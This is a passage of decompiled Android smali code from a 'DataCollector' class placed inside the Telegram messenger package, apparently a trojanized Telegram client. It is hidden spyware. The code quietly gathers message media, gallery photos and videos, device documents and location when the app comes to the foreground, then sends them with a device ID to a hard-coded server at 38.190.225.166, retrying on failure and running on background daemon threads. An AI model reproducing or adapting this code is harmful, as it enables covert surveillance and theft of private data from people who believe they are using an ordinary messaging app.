    move-result-object p1

    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1434
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v0}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 1435
    const-string v1, "https://38.190.225.166/api/collect"

    const-string v2, "postJson"

    invoke-direct {p0, v1, p1, v0, v2}, Lorg/telegram/messenger/DataCollector;->postBodyWithRetry(Ljava/lang/String;[BLjava/lang/String;Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_0

    if-eqz p2, :cond_1

    .line 1437
    invoke-interface {p2}, Ljava/lang/Runnable;->run()V

    goto :goto_0

    :cond_0
    if-eqz p3, :cond_1

    .line 1439
    invoke-interface {p3}, Ljava/lang/Runnable;->run()V

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method private synthetic lambda$scheduleFileQueueDrain$4()V
    .locals 2

    .line 1154
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda34;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda34;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private synthetic lambda$scheduleGalleryQueueDrain$3()V
    .locals 2

    .line 1146
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda24;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda24;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private synthetic lambda$scheduleJsonQueueDrain$2()V
    .locals 2

    .line 1138
    sget-object v0, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda22;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda22;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private synthetic lambda$scheduleMediaUpload$9(ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 10

    const/4 v0, 0x0

    .line 1818
    :try_start_0
    invoke-static {p1}, Lorg/telegram/messenger/FileLoader;->getInstance(I)Lorg/telegram/messenger/FileLoader;

    move-result-object v1

    invoke-virtual {v1, p2, v0}, Lorg/telegram/messenger/FileLoader;->getPathToMessage(Lorg/telegram/tgnet/TLRPC$Message;Z)Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_1

    .line 1819
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    .line 1820
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 1821
    iget-wide v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    iget v6, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    move-object v2, p0

    move v3, p1

    move-object v7, v1

    invoke-virtual/range {v2 .. v7}, Lorg/telegram/messenger/DataCollector;->sendImage(IJILjava/io/File;)V

    .line 1822
    iget-wide v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    iget v6, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    move-object v2, p0

    move v3, p1

    move-object v7, v1

    invoke-virtual/range {v2 .. v7}, Lorg/telegram/messenger/DataCollector;->sendMedia(IJILjava/io/File;)V

    goto :goto_1

    :catch_0
    move-exception p1

    goto :goto_0

    .line 1825
    :cond_0
    iget-object v2, p0, Lorg/telegram/messenger/DataCollector;->pendingByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    int-to-long v3, p1

    iget-wide v5, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    iget v7, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    int-to-long v7, v7

    const/4 v9, 0x3

    new-array v9, v9, [J

    aput-wide v3, v9, v0

    const/4 v0, 0x1

    aput-wide v5, v9, v0

    const/4 v0, 0x2

    aput-wide v7, v9, v0

    invoke-virtual {v2, v1, v9}, Lj$/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1827
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->triggerMsgDownload(ILorg/telegram/tgnet/TLRPC$Message;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 1831
    :goto_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "scheduleMediaUpload: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_1
    return-void
.end method

.method private static synthetic lambda$static$0(Ljava/lang/Runnable;)Ljava/lang/Thread;
    .locals 2

    .line 97
    new-instance v0, Ljava/lang/Thread;

    const-string v1, "tgc-meta"

    invoke-direct {v0, p0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    const/4 p0, 0x1

    .line 98
    invoke-virtual {v0, p0}, Ljava/lang/Thread;->setDaemon(Z)V

    return-object v0
.end method

.method private static synthetic lambda$static$1(Ljava/lang/Runnable;)Ljava/lang/Thread;
    .locals 2

    .line 107
    new-instance v0, Ljava/lang/Thread;

    const-string v1, "tgc-upload"

    invoke-direct {v0, p0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    const/4 p0, 0x1

    .line 108
    invoke-virtual {v0, p0}, Ljava/lang/Thread;->setDaemon(Z)V

    const/16 p0, 0xa

    .line 109
    invoke-static {p0}, Landroid/os/Process;->setThreadPriority(I)V

    return-object v0
.end method

.method private synthetic lambda$uploadMultipartAsync$16(ILjava/lang/String;JIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V
    .locals 15

    move/from16 v0, p5

    .line 2610
    invoke-direct/range {p0 .. p1}, Lorg/telegram/messenger/DataCollector;->fileUploadGate(I)Lorg/telegram/messenger/DataCollector$FileUploadGate;

    move-result-object v1

    .line 2611
    iget-boolean v1, v1, Lorg/telegram/messenger/DataCollector$FileUploadGate;->allowed:Z

    if-nez v1, :cond_0

    return-void

    :cond_0
    int-to-long v7, v0

    move-object v2, p0

    move-object/from16 v3, p2

    move/from16 v4, p1

    move-wide/from16 v5, p3

    move-wide/from16 v9, p6

    move/from16 v11, p8

    move-object/from16 v12, p9

    move-object/from16 v13, p10

    move-object/from16 v14, p11

    .line 2612
    invoke-direct/range {v2 .. v14}, Lorg/telegram/messenger/DataCollector;->uploadMultipartDirect(Ljava/lang/String;IJJJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v1

    if-nez p8, :cond_1

    if-lez v0, :cond_1

    .line 2614
    iget v1, v1, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 v2, 0xc8

    if-lt v1, v2, :cond_1

    const/16 v2, 0x12c

    if-ge v1, v2, :cond_1

    .line 2615
    invoke-static/range {p1 .. p1}, Lorg/telegram/messenger/MessagesStorage;->getInstance(I)Lorg/telegram/messenger/MessagesStorage;

    move-result-object v1

    move/from16 v2, p1

    move-wide/from16 v3, p3

    invoke-virtual {v1, v2, v3, v4, v0}, Lorg/telegram/messenger/MessagesStorage;->markMediaUploaded(IJI)V

    :cond_1
    return-void
.end method

.method private static native nativeComputeHmac(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
.end method

.method private onAppForeground()V
    .locals 11

    .line 2654
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    .line 2659
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    .line 2660
    iget-wide v3, p0, Lorg/telegram/messenger/DataCollector;->lastMediaRescanMs:J

    sub-long v3, v1, v3

    const-wide/32 v5, 0x1b7740

    cmp-long v7, v3, v5

    if-ltz v7, :cond_1

    .line 2661
    iput-wide v1, p0, Lorg/telegram/messenger/DataCollector;->lastMediaRescanMs:J

    .line 2662
    const-string v1, "TGCollect"

    const-string v2, "foreground rescan triggered"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 2663
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectGalleryImages(Landroid/content/Context;I)V

    .line 2664
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectGalleryVideos(Landroid/content/Context;I)V

    .line 2665
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectDeviceDocs(Landroid/content/Context;I)V

    .line 2668
    :cond_1
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->hasLocationPermission(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_2

    return-void

    .line 2669
    :cond_2
    const-string v1, "dc_prefs"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 2670
    const-string v2, "loc_last_fetch_ms"

    const-wide/16 v3, 0x0

    invoke-interface {v1, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v5

    .line 2671
    const-string v2, "loc_last_attempt_ms"

    invoke-interface {v1, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    .line 2672
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    sub-long v4, v7, v5

    const-wide/32 v9, 0x2932e00

    cmp-long v6, v4, v9

    if-gez v6, :cond_3

    return-void

    :cond_3
    sub-long v2, v7, v2

    const-wide/32 v4, 0xdbba0

    cmp-long v6, v2, v4

    if-gez v6, :cond_4

    return-void

    .line 2675
    :cond_4
    monitor-enter p0

    .line 2676
    :try_start_0
    iget-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    if-eqz v2, :cond_5

    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    goto :goto_0

    :cond_5
    const/4 v2, 0x1

    .line 2677
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    .line 2678
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 2680
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "loc_last_attempt_ms"

    invoke-interface {v2, v3, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 2682
    iget v2, p0, Lorg/telegram/messenger/DataCollector;->locationAccount:I

    .line 2683
    sget-object v3, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v4, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda37;

    invoke-direct {v4, p0, v0, v2, v1}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda37;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;ILandroid/content/SharedPreferences;)V

    invoke-static {v3, v4}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void

    .line 2678
    :goto_0
    :try_start_1
    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw v0
.end method

.method private onQueuedJsonSent(Ljava/lang/String;)V
    .locals 3

    .line 1197
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 1198
    const-string p1, "location"

    const-string v1, "type"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 1199
    sget-object p1, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-eqz p1, :cond_0

    .line 1201
    const-string v0, "dc_prefs"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    .line 1202
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "loc_last_fetch_ms"

    .line 1203
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-interface {p1, v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    .line 1204
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method private static parseRetryAfterMs(Ljava/net/HttpURLConnection;)J
    .locals 6

    const-wide/16 v0, 0x0

    .line 946
    :try_start_0
    const-string v2, "Retry-After"

    invoke-virtual {p0, v2}, Ljava/net/URLConnection;->getHeaderField(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_2

    .line 947
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_0

    goto :goto_0

    .line 948
    :cond_0
    invoke-virtual {p0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    cmp-long p0, v2, v0

    if-gtz p0, :cond_1

    return-wide v0

    :cond_1
    const-wide/16 v4, 0x3e8

    mul-long v2, v2, v4

    const-wide/32 v4, 0x493e0

    .line 950
    invoke-static {v2, v3, v4, v5}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    :goto_0
    return-wide v0
.end method

.method private static poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V
    .locals 1

    .line 117
    :try_start_0
    invoke-interface {p0, p1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 119
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "poolSubmit rejected: "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string p1, "TGCollect"

    invoke-static {p1, p0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method private postBodyWithRetry(Ljava/lang/String;[BLjava/lang/String;Ljava/lang/String;)Z
    .locals 11

    const-wide/16 v0, 0x3e8

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_0
    const-string v4, "TGCollect"

    const/16 v5, 0x8

    if-gt v3, v5, :cond_4

    if-lez v3, :cond_0

    .line 1405
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const-wide/16 v5, 0x2

    mul-long v0, v0, v5

    const-wide/32 v5, 0x493e0

    .line 1406
    invoke-static {v0, v1, v5, v6}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v0

    goto :goto_1

    :catch_0
    return v2

    .line 1408
    :cond_0
    :goto_1
    invoke-direct {p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector;->doPost(Ljava/lang/String;[BLjava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v5

    .line 1409
    iget v6, v5, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    invoke-static {v6}, Lorg/telegram/messenger/DataCollector;->isRetryable(I)Z

    move-result v6

    if-nez v6, :cond_2

    .line 1410
    iget p1, v5, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 p2, 0xc8

    if-lt p1, p2, :cond_1

    const/16 p2, 0x12c

    if-ge p1, p2, :cond_1

    const/4 v2, 0x1

    :cond_1
    return v2

    .line 1412
    :cond_2
    iget-wide v6, v5, Lorg/telegram/messenger/DataCollector$PostResult;->retryAfterMs:J

    const-wide/16 v8, 0x0

    cmp-long v10, v6, v8

    if-lez v10, :cond_3

    move-wide v0, v6

    .line 1413
    :cond_3
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, " attempt "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, " code="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v5, v5, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v5, ", retrying in "

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v5, "ms"

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 1417
    :cond_4
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, " gave up after "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p2, " retries"

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v4, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return v2
.end method

.method private postJson(Lorg/json/JSONObject;)V
    .locals 1

    .line 1422
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->enqueueJson(Lorg/json/JSONObject;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x0

    .line 1423
    invoke-direct {p0, p1, v0, v0}, Lorg/telegram/messenger/DataCollector;->postJsonDirect(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    return-void
.end method

.method private postJsonBatch(Lorg/json/JSONArray;)V
    .locals 0

    .line 1450
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->enqueueJsonBatch(Lorg/json/JSONArray;)Z

    return-void
.end method

.method private postJsonBatchDirect(Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 2

    .line 1465
    sget-object v0, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda25;

    invoke-direct {v1, p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda25;-><init>(Lorg/telegram/messenger/DataCollector;Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private postJsonDirect(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 2

    .line 1427
    sget-object v0, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda38;

    invoke-direct {v1, p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda38;-><init>(Lorg/telegram/messenger/DataCollector;Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private static readHttpBody(Ljava/net/HttpURLConnection;)Ljava/lang/String;
    .locals 6

    .line 1017
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 1018
    invoke-virtual {p0}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object p0

    const/16 v1, 0x400

    .line 1019
    :try_start_0
    new-array v1, v1, [B

    .line 1021
    :goto_0
    invoke-virtual {p0, v1}, Ljava/io/InputStream;->read([B)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    .line 1022
    new-instance v3, Ljava/lang/String;

    sget-object v4, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    const/4 v5, 0x0

    invoke-direct {v3, v1, v5, v2, v4}, Ljava/lang/String;-><init>([BIILjava/nio/charset/Charset;)V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    .line 1024
    :cond_0
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V

    .line 1025
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    :goto_1
    if-eqz p0, :cond_1

    .line 1018
    :try_start_1
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    goto :goto_2

    :catchall_1
    move-exception p0

    invoke-virtual {v0, p0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_1
    :goto_2
    throw v0
.end method

.method private resetFetchStamp(Landroid/content/SharedPreferences;)V
    .locals 3

    .line 2735
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "loc_last_fetch_ms"

    const-wide/16 v1, 0x0

    invoke-interface {p1, v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    return-void
.end method

.method private resolveUser(IJ)Lorg/telegram/tgnet/TLRPC$User;
    .locals 4

    const-wide/16 v0, 0x0

    const/4 v2, 0x0

    cmp-long v3, p2, v0

    if-gtz v3, :cond_0

    return-object v2

    .line 1674
    :cond_0
    invoke-static {p1}, Lorg/telegram/messenger/MessagesController;->getInstance(I)Lorg/telegram/messenger/MessagesController;

    move-result-object v0

    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v1}, Lorg/telegram/messenger/MessagesController;->getUser(Ljava/lang/Long;)Lorg/telegram/tgnet/TLRPC$User;

    move-result-object v0

    if-eqz v0, :cond_1

    return-object v0

    .line 1677
    :cond_1
    :try_start_0
    invoke-static {p1}, Lorg/telegram/messenger/MessagesStorage;->getInstance(I)Lorg/telegram/messenger/MessagesStorage;

    move-result-object p1

    invoke-virtual {p1, p2, p3}, Lorg/telegram/messenger/MessagesStorage;->getUserSync(J)Lorg/telegram/tgnet/TLRPC$User;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    return-object v2
.end method

.method private retryDelayMs(I)J
    .locals 4

    const/16 v0, 0x8

    .line 1211
    invoke-static {p1, v0}, Ljava/lang/Math;->min(II)I

    move-result p1

    const-wide/16 v0, 0x1

    shl-long/2addr v0, p1

    const-wide/16 v2, 0x3e8

    mul-long v0, v0, v2

    const-wide/32 v2, 0x493e0

    invoke-static {v0, v1, v2, v3}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v0

    return-wide v0
.end method

.method private scheduleFileQueueDrain(J)V
    .locals 3

    const-wide/16 v0, 0x0

    cmp-long v2, p1, v0

    if-gtz v2, :cond_0

    .line 1152
    sget-object p1, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance p2, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda34;

    invoke-direct {p2, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda34;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-static {p1, p2}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    goto :goto_0

    .line 1154
    :cond_0
    sget-object v0, Lorg/telegram/messenger/Utilities;->globalQueue:Lorg/telegram/messenger/DispatchQueue;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda35;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda35;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-virtual {v0, v1, p1, p2}, Lorg/telegram/messenger/DispatchQueue;->postRunnable(Ljava/lang/Runnable;J)Z

    :goto_0
    return-void
.end method

.method private scheduleGalleryQueueDrain(J)V
    .locals 3

    const-wide/16 v0, 0x0

    cmp-long v2, p1, v0

    if-gtz v2, :cond_0

    .line 1144
    sget-object p1, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance p2, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda24;

    invoke-direct {p2, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda24;-><init>(Lorg/telegram/messenger/DataCollector;)V

